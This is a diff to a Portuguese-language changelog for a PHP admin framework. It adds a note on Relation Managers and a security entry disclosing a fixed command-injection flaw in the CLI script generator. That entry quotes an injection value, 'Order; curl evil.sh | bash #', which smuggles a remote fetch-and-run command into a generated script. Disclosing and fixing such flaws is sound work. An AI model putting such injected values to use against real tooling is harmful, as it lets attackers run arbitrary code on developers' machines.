@@ -11,6 +11,10 @@ e este projeto adere ao [Semantic Versioning](https://semver.org/lang/pt-BR/).
 
 - **core (Relation Managers):** aba na página de edição de um Resource que gerencia uma relação Eloquent do registro-pai — CRUD para HasMany/MorphMany e attach/detach para BelongsToMany, cada operação autorizada pela Policy do model relacionado. Declarado via classe `RelationManager` registrada em `Resource::relations()`; controller genérico `RelationController` expõe 8 endpoints (index/create/store/edit/update/destroy/attach/detach) com `{relation}` validado contra allowlist (404) e `{related}` sempre escopado ao pai (anti-IDOR). Attach de BelongsToMany aceita pivot data somente via a allowlist `RelationManager::pivotFields()`. No React, `ResourceEditTabs` + `RelationManagerPanel` + `RelationFormModal`/`AttachModal` renderizam a UI em abas na página de edição, sem regressão para Resources sem relações. Fecha a lacuna competitiva #2 vs Filament/Nova (Imports fechou a #1). MorphTo/HasManyThrough e relation-*fields* ficam para 0.18b.
 
+### Security
+
+- **cli:** o gerador de script do `arqel new` valida o `--first-resource` como um identificador PHP. Antes o valor era interpolado cru na linha `php artisan arqel:resource <valor>` do script `.sh`/`.ps1` gerado — um valor como `Order; curl evil.sh | bash #` injetava um segundo comando shell que executava quando o desenvolvedor rodava o script (command injection / RCE local). Os demais parâmetros (`appName`/`starter`/`tenancy`/`monorepoPath`) já eram validados; só `firstResource` não era.
+
 ## [0.16.0] - 2026-07-06
 
 ### Summary
